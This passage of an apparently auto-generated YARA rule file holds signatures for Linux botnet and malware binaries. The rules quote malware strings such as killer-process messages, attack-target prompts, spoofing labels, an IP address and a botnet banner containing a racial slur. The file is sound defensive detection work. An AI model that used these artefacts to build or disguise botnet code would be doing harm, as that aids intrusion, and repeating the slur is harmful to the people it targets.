      $s16 = "/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv6l/bin/../cc/include" fullword ascii
      $s17 = "buf.4507" fullword ascii
      $s18 = "i.4743" fullword ascii
      $s19 = "buf.6549" fullword ascii

      $op0 = { dc ff ff ff dc ff ff ff 94 6a 00 00 dc ff ff ff }
      $op1 = { f0 4f 2d e9 08 54 9f e5 08 34 9f e5 05 50 8f e0 }
      $op2 = { ef 00 00 55 e3 0c 00 a0 03 00 00 a0 13 04 d0 8d }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_149 {
   meta:
      description = "Linux_149"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d7e3112049c120623ecd43b59a9b8f78762ac2dfaddb022d52b34eb64a7b41a8"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii
      $s2 = "completed.2296" fullword ascii
      $s3 = "object.2349" fullword ascii
      $s4 = "libc/sysdeps/linux/mips/crtn.S" fullword ascii
      $s5 = "libc/string/mips/memcpy.S" fullword ascii
      $s6 = "libc/sysdeps/linux/mips/crti.S" fullword ascii
      $s7 = "been_there_done_that.2792" fullword ascii
      $s8 = "libc/string/mips/memset.S" fullword ascii
      $s9 = "libc/sysdeps/linux/mips/crt1.S" fullword ascii
      $s10 = "next_start.1065" fullword ascii
      $s11 = "qual_chars.4050" fullword ascii
      $s12 = "spec_ranges.4047" fullword ascii
      $s13 = "spec_flags.4045" fullword ascii
      $s14 = "spec_and_mask.4049" fullword ascii
      $s15 = "spec_chars.4046" fullword ascii
      $s16 = "xdigits.3043" fullword ascii
      $s17 = "spec_base.4044" fullword ascii
      $s18 = "prefix.4045" fullword ascii
      $s19 = "spec_or_mask.4048" fullword ascii
      $s20 = "p.2294" fullword ascii

      $op0 = { 10 00 00 03 34 42 00 04 34 42 00 08 00 00 18 21 }
      $op1 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
      $op2 = { 02 e2 10 2a 10 40 00 03 02 34 10 2a 14 40 ff 95 }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_150 {
   meta:
      description = "Linux_150"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "51469b2d273423acb55f71636cd2f3c06e2c706ff2cc7d28b91b142334e9f747"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "connecthosts" fullword ascii
      $s8 = "killer_cmdlinelol" fullword ascii
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s10 = "cmdparse" fullword ascii
      $s11 = "pathread" fullword ascii
      $s12 = "Sending requests to: %s:%d " fullword ascii
      $s13 = "FRAMESZ" fullword ascii
      $s14 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s15 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s16 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s17 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s18 = "attackpids" fullword ascii
      $s19 = "whitlistpaths" fullword ascii
      $s20 = "estring" fullword ascii

      $op0 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
      $op1 = { 14 62 00 02 24 62 ff ff af a2 00 34 8f a2 00 34 }
      $op2 = { a3 a0 00 5f 27 a6 00 41 3c 02 0c cc 34 4c cc cc }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_151 {
   meta:
      description = "Linux_151"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c192146c8311694342f73a19cfe69ecc53f3f1d6cab006526d2daa5134846357"
   strings:
      $s1 = "FRAMESZ" fullword ascii
      $s2 = "hoste.6559" fullword ascii
      $s3 = "completed.4786" fullword ascii
      $s4 = "LOCALSZ" fullword ascii
      $s5 = "__GI___waitpid" fullword ascii
      $s6 = "__GI___libc_waitpid" fullword ascii
      $s7 = "__waitpid" fullword ascii
      $s8 = "__sys_recvmsg" fullword ascii
      $s9 = "next_start.1303" fullword ascii
      $s10 = "unknown.1327" fullword ascii
      $s11 = "spec_or_mask.6324" fullword ascii
      $s12 = "spec_and_mask.6325" fullword ascii
      $s13 = "prefix.6318" fullword ascii
      $s14 = "setjmp_aux.c" fullword ascii
      $s15 = "object.4798" fullword ascii
      $s16 = "__sigsetjmp_aux" fullword ascii
      $s17 = "qual_chars.6326" fullword ascii
      $s18 = "spec_base.6317" fullword ascii
      $s19 = "spec_flags.6321" fullword ascii
      $s20 = "spec_chars.6322" fullword ascii

      $op0 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
      $op1 = { af c2 00 34 8f c2 00 34 }
      $op2 = { 24 42 00 01 af c2 00 34 8f c2 00 34 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_152 {
   meta:
      description = "Linux_152"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "87b6792aea1eeeefe31996249165087853d40e94f864aa37bbc0d1bde330fb4d"
   strings:
      $s1 = " $Bh`'9h" fullword ascii

      $op0 = { 8f a2 00 3c 34 10 ff ff 10 50 00 5b }
      $op1 = { 03 20 f8 09 af a2 00 c0 3c 07 7f 80 34 e7 7f 81 }
      $op2 = { 02 60 10 21 8f bf 00 38 8f b7 00 34 8f b6 00 30 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_153 {
   meta:
      description = "Linux_153"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8eaa7ef1303ae4c3ba46fcc1033869d714303e3f8807e3857fc863555575b393"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s2 = "oaat)ehmra" fullword ascii

      $op0 = { a1 34 a0 10 90 10 00 13 40 00 06 e7 92 10 00 10 }
      $op1 = { 80 a4 e0 00 d0 34 20 04 92 10 00 15 02 bf ff cd }
      $op2 = { 80 a2 3f ff 02 80 00 04 80 a2 20 00 04 80 00 04 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_154 {
   meta:
      description = "Linux_154"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "2064f7eaad3f7eaf4f3d9365aed9166db89b7ff0598da6a7c8bd0127debfeaf7"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f }
      $op1 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op2 = { f4 ff ff ff f4 ff ff ff 28 23 00 00 f4 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_155 {
   meta:
      description = "Linux_155"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3a4e54985c5827b9af4fd7f13fa85ee5fc635163c726f6f9076730b699d0f660"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s2 = " $B`$'9]p" fullword ascii

      $op0 = { 03 20 f8 09 af a2 10 c4 3c 03 80 00 34 63 80 01 }
      $op1 = { 02 40 a0 21 25 22 ff ff 30 49 ff ff 34 03 ff ff }
      $op2 = { 02 60 10 21 8f bf 00 38 8f b7 00 34 8f b6 00 30 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_156 {
   meta:
      description = "Linux_156"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8dc0feba0f39ce28028807380312122128a0bdd57400bf23fdf105567fac6a89"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s2 = "dB$Hb9'" fullword ascii

      $op0 = { 01 00 42 a2 34 00 a3 8f 30 00 a4 8f 48 00 a9 8f }
      $op1 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
      $op2 = { ff 7f 02 3c ff ff 42 34 21 58 00 00 02 00 a0 14 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_157 {
   meta:
      description = "Linux_157"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "be7518409d1197a57bfd0eeba37a6c21550d15187675de1245877deba07dd1bf"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii

      $op0 = { ea 63 0f 8d e2 00 10 a0 e1 0c 02 00 eb 00 60 a0 }
      $op1 = { 70 40 2d e9 00 40 51 e2 46 df 4d e2 00 60 a0 e1 }
      $op2 = { ea 03 00 9d e8 08 d0 8d e2 70 80 bd e8 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_158 {
   meta:
      description = "Linux_158"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ab5ee18fd3df5a2d7f2d84c75b33fd2f73b76c8e0d2df278d9ded40943d16911"
   strings:
      $s1 = "FRAMESZ" fullword ascii
      $s2 = "hoste.6559" fullword ascii
      $s3 = "completed.4786" fullword ascii
      $s4 = "A/etc/hosts" fullword ascii
      $s5 = "LOCALSZ" fullword ascii
      $s6 = "__GI___waitpid" fullword ascii
      $s7 = "__GI___libc_waitpid" fullword ascii
      $s8 = "__waitpid" fullword ascii
      $s9 = "__sys_recvmsg" fullword ascii
      $s10 = "next_start.1303" fullword ascii
      $s11 = "unknown.1327" fullword ascii
      $s12 = "spec_or_mask.6324" fullword ascii
      $s13 = "spec_and_mask.6325" fullword ascii
      $s14 = "prefix.6318" fullword ascii
      $s15 = "setjmp_aux.c" fullword ascii
      $s16 = "object.4798" fullword ascii
      $s17 = "__sigsetjmp_aux" fullword ascii
      $s18 = "qual_chars.6326" fullword ascii
      $s19 = "spec_base.6317" fullword ascii
      $s20 = "spec_flags.6321" fullword ascii

      $op0 = { 26 18 62 00 37 9e 02 3c b9 79 42 34 26 20 62 00 }
      $op1 = { 1c 00 c0 af 34 00 c3 8f }
      $op2 = { 01 00 42 24 24 00 c2 af 34 00 c2 8f }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_159 {
   meta:
      description = "Linux_159"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f831889e4fd0c93e6b34c154b3d2e54feb0c36d3e2379a508916c7608e49988d"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii

      $op0 = { 01 00 00 a8 35 fe ff cc 34 fe ff fc }
      $op1 = { c0 a0 e1 f0 6f ac e8 34 0e 00 ea 00 00 a0 e1 77 }
      $op2 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f 00 00 0c }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( all of them and all of ($op*) )
}

rule Linux_160 {
   meta:
      description = "Linux_160"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "12ec4ba0eb6c327c01f4b7f9e85a398df8ed1f98e85ccff9f31054e632a35767"
   strings:
      $s1 = "tQmMiIlRI" fullword ascii /* base64 encoded string 'Bc""TH' */
      $s2 = "* j7xV" fullword ascii
      $s3 = "CLlD -HO" fullword ascii
      $s4 = "Imt.BLh" fullword ascii
      $s5 = " gcMd!%" fullword ascii
      $s6 = "$Id: UPX 4.10 Copyright (C) 1996-2023 the UPX Team. All Rights Reserved. $" fullword ascii
      $s7 = "p7* H>" fullword ascii
      $s8 = "].Wq -" fullword ascii
      $s9 = "|!+ tk" fullword ascii
      $s10 = "pcfPfp6" fullword ascii
      $s11 = "'- z!y" fullword ascii
      $s12 = "\\ZXLH+;%" fullword ascii
      $s13 = "b -;_5" fullword ascii
      $s14 = "pzevfl" fullword ascii
      $s15 = "- .2C:@8" fullword ascii
      $s16 = "_P'q* |" fullword ascii
      $s17 = "MPlEurV" fullword ascii
      $s18 = "tREz`\\" fullword ascii
      $s19 = "EWVaXyG" fullword ascii
      $s20 = "+Faej%/E" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 5000KB and
      8 of them
}

rule Linux_161 {
   meta:
      description = "Linux_161"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7636a9c970b9f730fd6d7dbff1c5b9463052528dbfd5813517e7de461c374cfc"
   strings:
      $s1 = "bWcl:\\" fullword ascii
      $s2 = "* <Pcf*" fullword ascii
      $s3 = "'0(%I%" fullword ascii
      $s4 = "bR9C:\\" fullword ascii
      $s5 = "$Id: UPX 4.10 Copyright (C) 1996-2023 the UPX Team. All Rights Reserved. $" fullword ascii
      $s6 = "| LOGF" fullword ascii
      $s7 = "exkare" fullword ascii
      $s8 = "sLGXpM9" fullword ascii
      $s9 = "O)}fbRR -" fullword ascii
      $s10 = "&g]C* " fullword ascii
      $s11 = "XR$|* " fullword ascii
      $s12 = ",iW0.!." fullword ascii
      $s13 = "yalODJ6" fullword ascii
      $s14 = "[,gM- 8P" fullword ascii
      $s15 = "Ky- )w-" fullword ascii
      $s16 = "lTXmqO2" fullword ascii
      $s17 = " /J 7{" fullword ascii
      $s18 = "c- m#>" fullword ascii
      $s19 = "gI\"uH,k\"* " fullword ascii
      $s20 = "2m- P&5;" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 6000KB and
      8 of them
}

rule Linux_162 {
   meta:
      description = "Linux_162"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "af985ec54de3697a411f07141bb8771a824929dccc35bda46558dd3f93a01af9"
   strings:
      $s1 = "* x8Q8Z" fullword ascii
      $s2 = "* X>J," fullword ascii
      $s3 = "7CMDZEox>" fullword ascii
      $s4 = "$)eP:\\" fullword ascii
      $s5 = "$Id: UPX 4.10 Copyright (C) 1996-2023 the UPX Team. All Rights Reserved. $" fullword ascii
      $s6 = "FeyEPy" fullword ascii
      $s7 = "\\hpgA]PK" fullword ascii
      $s8 = "^z* B/" fullword ascii
      $s9 = ";- \\ |" fullword ascii
      $s10 = "hw7- g" fullword ascii
      $s11 = "_ -%Gp" fullword ascii
      $s12 = "VNkTXk3" fullword ascii
      $s13 = "gulwfT8" fullword ascii
      $s14 = "\\%.bsm" fullword ascii
      $s15 = "\\$%i[L" fullword ascii
      $s16 = "Au /vI" fullword ascii
      $s17 = "`?HPZ@ -" fullword ascii
      $s18 = "CI- O0y" fullword ascii
      $s19 = "xSAM]t" fullword ascii
      $s20 = " -N l.|" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 4000KB and
      8 of them
}

rule Linux_163 {
   meta:
      description = "Linux_163"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9c7a12678651d72127c3c6e4dac250439fa4a3be0a8728754cea327c86a529a2"
   strings:
      $s1 = "JGET <host>" fullword ascii
      $s2 = "note.gnu.prope" fullword ascii
      $s3 = "SPOOFS  " fullword ascii
      $s4 = "Mozilla/4.75" fullword ascii
      $s5 = "/%HTTP/1.0" fullword ascii
      $s6 = "NOTICE %s :Unabl" fullword ascii
      $s7 = "socketyhttp:///" fullword ascii
      $s8 = "eh_frame#_ar" fullword ascii
      $s9 = "e to comply." fullword ascii
      $s10 = "ARAQAPWV" fullword ascii
      $s11 = "XAVAWPH" fullword ascii
      $s12 = "$Id: UPX 4.21 Copyright (C) 1996-2023 the UPX Team. All Rights Reserved. $" fullword ascii
      $s13 = "ck3pleBoSw" fullword ascii
      $s14 = "build-idYO" fullword ascii
      $s15 = "!vjcM=^5" fullword ascii
      $s16 = " Ziggy St" fullword ascii
      $s17 = "-nBnk?" fullword ascii
      $s18 = "(\"MrWs. ES+d'" fullword ascii
      $s19 = "eihJ5G+" fullword ascii
      $s20 = "n4R? keym(" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule Linux_164 {
   meta:
      description = "Linux_164"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9d40da7df0b84579fb9c7f1c2bf5f507e09ad3ee05f0a4e4eb64666d8c518c79"
   strings:
      $s1 = "ZhbRYkQ" fullword ascii
      $s2 = "OATPeeq" fullword ascii
      $s3 = "RSeoN3_" fullword ascii
      $s4 = "SfrZ!2(U;" fullword ascii
      $s5 = "ecwD%`z" fullword ascii
      $s6 = "tZejT'zA" fullword ascii
      $s7 = "WHndf0H" fullword ascii
      $s8 = "\\z\\I<'IaB" fullword ascii
      $s9 = "lVAX79" fullword ascii
      $s10 = "j\"AZR^j" fullword ascii
      $s11 = "!*_ 7UF\"Ym" fullword ascii
      $s12 = "vz+H9m~" fullword ascii
      $s13 = "=b.`<?" fullword ascii
      $s14 = "HhZ\\2$" fullword ascii
      $s15 = "[Re+r:R" fullword ascii
      $s16 = ".H[ W}" fullword ascii
      $s17 = "*)(VM#" fullword ascii
      $s18 = "f_tm8P" fullword ascii
      $s19 = ":XrA%&" fullword ascii
      $s20 = "q[jziU" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_165 {
   meta:
      description = "Linux_165"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a6e7d7c35745c13cac8eb98d035933c291ecbfd44553b1145c9e11b013f51c1f"
   strings:
      $s1 = "M- !S2" fullword ascii
      $s2 = "HXfm6gM" fullword ascii
      $s3 = "mQDA0Mh" fullword ascii
      $s4 = "GAXd=bZ" fullword ascii
      $s5 = "coMUK," fullword ascii
      $s6 = "XGcHwWoZ[" fullword ascii
      $s7 = "cFco\"0" fullword ascii
      $s8 = "SEhR]\"" fullword ascii
      $s9 = "j\"AZR^j" fullword ascii
      $s10 = "0!?Ku#" fullword ascii
      $s11 = "RO[e(F" fullword ascii
      $s12 = "6d{UmM" fullword ascii
      $s13 = "p'[_#DrJ%4" fullword ascii
      $s14 = "4$W7P\\" fullword ascii
      $s15 = "pdoX^'" fullword ascii
      $s16 = "_mXr'T!0]W" fullword ascii
      $s17 = "jX_B1K" fullword ascii
      $s18 = "qW>+(^" fullword ascii
      $s19 = "0.ibgi" fullword ascii
      $s20 = "^dWA[TJ" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_166 {
   meta:
      description = "Linux_166"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b5ba78679140fd6d6b53f45d56f572b630f138de9ed6ff8613eabb8f4015710c"
   strings:
      $s1 = "M- !S2" fullword ascii
      $s2 = "SEhR]\"" fullword ascii
      $s3 = "1opCoXC\\d2" fullword ascii
      $s4 = "nXok;t)Wh7" fullword ascii
      $s5 = "Sjzrxd" fullword ascii
      $s6 = "j\"AZR^j" fullword ascii
      $s7 = "Q6CDY7" fullword ascii
      $s8 = "T`v<x;=." fullword ascii
      $s9 = "7A'=l5" fullword ascii
      $s10 = ":WW6(L1a" fullword ascii
      $s11 = "2nS|vu" fullword ascii
      $s12 = "m>ObW6" fullword ascii
      $s13 = "SJYryv" fullword ascii
      $s14 = "~wj'My" fullword ascii
      $s15 = "^KUcQ&" fullword ascii
      $s16 = "|S%&Ip" fullword ascii
      $s17 = "r}qAn," fullword ascii
      $s18 = "<^%.uN" fullword ascii
      $s19 = "ki)SS)" fullword ascii
      $s20 = "|4|S._" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_167 {
   meta:
      description = "Linux_167"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c561b3c6cf8ca5288935a8aa1c9d0d4b74040d177eaec2dd3538ccdc1f345e40"
   strings:
      $s1 = "M- !S2" fullword ascii
      $s2 = "zosxh554" fullword ascii
      $s3 = "SEhR]\"" fullword ascii
      $s4 = "hfec\\?" fullword ascii
      $s5 = "hI:Com;?" fullword ascii
      $s6 = "WHDFurP" fullword ascii
      $s7 = "ukcnPfg" fullword ascii
      $s8 = "tescCHD" fullword ascii
      $s9 = "j\"AZR^j" fullword ascii
      $s10 = "Q6CDY7" fullword ascii
      $s11 = "T`v<x;=." fullword ascii
      $s12 = "7A'=l5" fullword ascii
      $s13 = ":WW6(L1a" fullword ascii
      $s14 = "2nS|vu" fullword ascii
      $s15 = "m>ObW6" fullword ascii
      $s16 = "SJYryv" fullword ascii
      $s17 = "K{) _=" fullword ascii
      $s18 = "K?Q{et" fullword ascii
      $s19 = "\".Ej`LCy" fullword ascii
      $s20 = "?b9)p?" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_168 {
   meta:
      description = "Linux_168"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d065a8e63974d197f5588c33a083b087f386fc61af8670b3beb53cb4a37a0894"
   strings:
      $s1 = "M- !S2" fullword ascii
      $s2 = "SEhR]\"" fullword ascii
      $s3 = "<HJPV>oG" fullword ascii
      $s4 = "bWmg`#(" fullword ascii
      $s5 = "wiQf\"K9" fullword ascii
      $s6 = "UvMg^$9" fullword ascii
      $s7 = "TDqP~\\" fullword ascii
      $s8 = "JhRRR8" fullword ascii
      $s9 = "j\"AZR^j" fullword ascii
      $s10 = "Q6CDY7" fullword ascii
      $s11 = "T`v<x;=." fullword ascii
      $s12 = "7A'=l5" fullword ascii
      $s13 = ":WW6(L1a" fullword ascii
      $s14 = "2nS|vu" fullword ascii
      $s15 = "m>ObW6" fullword ascii
      $s16 = "SJYryv" fullword ascii
      $s17 = "[P1p_|" fullword ascii
      $s18 = "G_^{P2.X" fullword ascii
      $s19 = "W^vjf]" fullword ascii
      $s20 = "Z2Et\\xj" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_169 {
   meta:
      description = "Linux_169"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d777cde866f1e60ff0040c5e5ed1eb0a05eb86c46eb90a38637a7c12f8506042"
   strings:
      $s1 = "icqLI\"" fullword ascii
      $s2 = "@=OKdtFmQ" fullword ascii
      $s3 = "yQnL PC" fullword ascii
      $s4 = "JyRiQWZ-" fullword ascii
      $s5 = "\\gs4`^" fullword ascii
      $s6 = "\\te,TX" fullword ascii
      $s7 = "\\7}u7056:O" fullword ascii
      $s8 = "j\"AZR^j" fullword ascii
      $s9 = "2PoBM<" fullword ascii
      $s10 = "cU{?mI" fullword ascii
      $s11 = "!)h+b]" fullword ascii
      $s12 = ",zDM/Ls" fullword ascii
      $s13 = "!yvo0@" fullword ascii
      $s14 = "'O|~%H" fullword ascii
      $s15 = "4[3tY^" fullword ascii
      $s16 = "*}Qw7Vro" fullword ascii
      $s17 = "'\"q|FA" fullword ascii
      $s18 = "[)`2MXZm" fullword ascii
      $s19 = "1DX23T\"T9J" fullword ascii
      $s20 = "7=zTJJ" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_170 {
   meta:
      description = "Linux_170"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0141893f82225214872abf477057db72b44aaed810a7455c1b07121144a26779"
   strings:
      $s1 = " SHORELINE BOTNET THA REAL SHIT NIGGA" fullword ascii

      $op0 = { 03 20 f8 09 34 10 ff ff 8f bc 00 18 17 d0 ff b4 }
      $op1 = { 24 97 00 08 24 9e 00 34 1a 80 ff ff }
      $op2 = { 03 20 f8 09 34 10 ff ff 8f bc 00 18 16 b0 ff 9f }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_171 {
   meta:
      description = "Linux_171"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0a2cb373cc0ddf354ba60e8a0f200299ba1d6b0892aebf5905b0150e94276304"
   strings:
      $s1 = " SHORELINE BOTNET THA REAL SHIT NIGGA" fullword ascii

      $op0 = { 03 20 f8 09 34 10 ff ff 8f bc 00 18 17 d0 ff b4 }
      $op1 = { 24 97 00 08 24 9e 00 34 1a 80 ff ff }
      $op2 = { 03 20 f8 09 34 10 ff ff 8f bc 00 18 16 b0 ff 9f }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_172 {
   meta:
      description = "Linux_172"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d90a3e8c762e39b80647bd0f4eefcf66842e6f203f73949f2570d634309ded53"
   strings:
      $s1 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s5 = "__vdso_clock_gettime" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s7 = "zkjtjaz" fullword ascii
      $s8 = "214.194.12.158" fullword ascii
      $s9 = "zltkaz" fullword ascii
      $s10 = "LINUX_2.6" fullword ascii
      $s11 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" fullword ascii
      $s12 = ";<;(3uljktmtmZ" fullword ascii
      $s13 = "2(57?uohtjthmnitkklz" fullword ascii
      $s14 = "3.uljktmtmzr" fullword ascii
      $s15 = "2(57?uoktjthmjntkjiz" fullword ascii
      $s16 = "?()354uctkthz" fullword ascii
      $s17 = "3.uoimtilzr" fullword ascii
      $s18 = ";<;(3uoimtilZ" fullword ascii
      $s19 = "92/41?>Z" fullword ascii
      $s20 = "(?<(?)2`Z" fullword ascii

      $op0 = { ea 00 00 e0 e3 70 40 bd e8 1e ff 2f e1 00 30 d0 }
      $op1 = { 51 e3 0b 00 00 1a 0f 00 52 e3 00 00 53 93 00 10 }
      $op2 = { 10 02 00 04 e0 2d e5 40 30 9f e5 00 00 53 e3 04 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_173 {
   meta:
      description = "Linux_173"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d546a2070bd57c50365ad2f55f8e10bd2bdee3e7317dc44715b11ffdcaca3534"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x2 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x5 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
